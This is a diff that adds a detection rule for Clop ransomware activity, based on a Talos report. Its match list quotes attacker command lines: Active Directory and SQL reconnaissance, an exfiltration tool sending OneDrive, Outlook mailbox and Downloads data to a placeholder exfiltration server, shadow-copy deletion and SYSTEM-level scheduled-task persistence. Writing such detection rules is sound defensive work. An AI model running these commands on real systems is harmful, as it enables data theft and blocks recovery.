@@ -1,0 +1,42 @@
+title: Clop Ransomware Commands
+id: 0c8f1d35-9b26-4a00-95d5-5ebb66604b04
+description: New Clop Ranswomare IOCs as reported by Talos
+status: experimental
+date: 2022/12/09
+author: Josh Nickels
+references:
+    - https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/
+logsource:
+    category: command
+    product: windows
+detection:
+    CommandLine:
+        - "adfind.exe -f &(objectcategory=computer) operatingsystem -csv"
+        - "adfind -f objectcategory=person samaccountname name displayname givenname department description title mail logoncount -csv"
+        - "adfind.exe -h * -f &(objectcategory=computer) operatingsystem samaccountname name displayname givenname department description title mail logoncount -csv"
+        - "sqlcmd -q select name from sys.databases"
+        - "sqlcmd -s <hostname> -q select name from sys.databases"
+        - "sqlcmd -s <hostname> -q set nocount on; select table_name from information_schema.tables where table_type = 'base table'  -h -1 -w -e -d cct_db"
+        - "*.exe /RH:<exfiltration server> /RP:443 /x:* /MX:thumbs.db /MX:*.exe /MX:*.mov /MX:*.dll /P:<remote path> /d:\\<local network host>\c$\users\<username>\onedrive"
+        - "*.exe /RH:<exfiltration server> /RP:443 /x:* /MX:thumbs.db /M:*.ost /M:*.pst /P:<remote path> /d:\\<local network host>\c$\users\<username>\appdata\local\microsoft\outlook"
+        - "*.exe /RH:<exfiltration server> /RP:443 /x:* /MX:thumbs.db /MX:*.exe /MX:*.mov /MX:*.dll /P:<remote path> /d:\\<local network host>\c$\users\<username>\downloads"
+        - "C:\Windows\System32\wbem\WMIC.exe shadowcopy where ID=* delete"
+        - "C:\windows\WinCDropQSysvolY.exe"
+        - "C:\windows\WinCDropQSysvolY.exe runrun"
+        - "schtasks.exe /create /tn OneDrvTest /tr C:\windows\SysZDropQLogonQ.exe /s"
+        - "* /sc onstart /ru system /f"
+        - "schtasks.exe /run /tn OneDrvTest /s *"
+    condition: CommandLine
+falsepositives:
+    - none
+level: high
+tags:
+    - attack.initial_access
+    - attack.persistence
+    - attack.defense_evasion
+    - attack.credential_access
+    - attack.collection
+    - attack.discovery
+    - attack.lateral_movement
+    - attack.command_and_control
+    - attack.impact
